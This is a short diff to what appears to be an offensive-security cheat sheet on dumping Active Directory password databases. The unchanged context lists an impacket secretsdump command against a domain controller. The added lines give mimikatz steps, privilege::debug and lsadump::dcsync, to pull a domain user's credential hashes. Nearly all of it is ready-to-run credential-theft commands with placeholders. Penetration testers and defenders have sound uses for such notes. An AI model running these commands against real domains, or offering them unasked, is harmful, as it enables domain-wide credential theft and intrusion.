@@ -20,3 +20,10 @@ Extracting AD password Database using impacket-secretsdump:
 secretsdump.py -outputfile <outputfilename> -just-dc <domain>/<username>@<dcip>
 #Use -just-dc-ntlm for ntlm hash only, -just-dc-user to retrieve specific user
 ```
+
+Extracting AD password Database using mimikatz:
+```
+.\mimikatz.exe
+privilege::debug
+lsadump::dcsync /domain:<domainname> /user:<domain>\<username>
+```
